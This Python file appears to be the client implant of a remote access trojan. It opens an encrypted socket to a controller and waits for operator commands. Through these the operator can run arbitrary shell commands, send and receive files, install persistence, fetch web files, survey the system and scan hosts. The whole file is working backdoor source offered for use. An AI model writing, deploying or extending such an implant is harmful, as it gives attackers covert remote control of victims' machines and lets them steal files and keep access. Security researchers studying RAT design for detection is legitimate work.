#!/usr/bin/env python
# -*- coding: utf-8 -*-

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import socket
import subprocess
import struct
import sys

try:
    from core.crypto import AES_decrypt, AES_encrypt, diffiehellman
    from core.filesock import recvfile, sendfile
    from core.persistence import run
    from core.scan import single_host
    from core.survey import run
    from core.toolkit import wget, unzip
except ImportError as e:
    print(e)
    sys.exit(0)

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

PLAT_TYPE = sys.platform
HOST      = 'localhost'
PORT      = 1337
FB_KEY    = 'b14ce95fa4c33ac2803782d18341869f'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    DHKEY = diffiehellman(s)

    while True:
        data = s.recv(1024)
        data = AES_decrypt(data, DHKEY)

        cmd, _, action = data.partition(' ') # seperate prompt into command and action

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(AES_encrypt(results, DHKEY))

        # send file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                sendfile(s, fname, DHKEY)

        # receive file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                recvfile(s, fname, DHKEY)

        # regenerate DH key
        elif cmd == 'rekey':
            DHKEY = diffiehellman(s)

        # apply persistence mechanism
        elif cmd == 'persistence':
            results = run(PLAT_TYPE)
            s.send(AES_encrypt(results, DHKEY))

        # download a file from the web
        elif cmd == 'wget':
            results = wget(action)
            s.send(AES_encrypt(results, DHKEY))

        # unzip a file
        elif cmd == 'unzip':
            results = unzip(action)
            s.send(AES_encrypt(results, DHKEY))

        # run system survey
        elif cmd == 'survey':
            results = run(PLAT_TYPE)
            s.send(AES_encrypt(results, DHKEY))

        # run a scan
        elif cmd == 'scan':
            results = single_host(action)
            s.send(AES_encrypt(results, DHKEY))

#----------------------------------------------------------------------------------------------------------------------------#

#----------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    main()
